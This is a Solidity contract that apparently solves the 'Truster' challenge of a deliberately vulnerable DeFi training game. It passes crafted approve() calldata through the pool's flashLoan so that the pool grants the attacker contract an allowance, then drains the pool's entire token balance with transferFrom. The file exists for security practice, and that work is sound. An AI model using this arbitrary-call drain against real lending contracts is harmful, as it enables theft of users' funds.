// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TrusterAttack {
    address payable pool;
    address token;

    constructor(address payable _trusterLenderPoolAddress, address _damnVulnerableTokenAddress) {
        pool = _trusterLenderPoolAddress;
        token = _damnVulnerableTokenAddress;
    }

    function attack() public {
        uint256 poolBalance = IERC20(token).balanceOf(pool);
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance);
        TrusterLenderPool(pool).flashLoan(0, msg.sender, token, data);
        IERC20(token).transferFrom(pool, msg.sender, poolBalance);
    }
}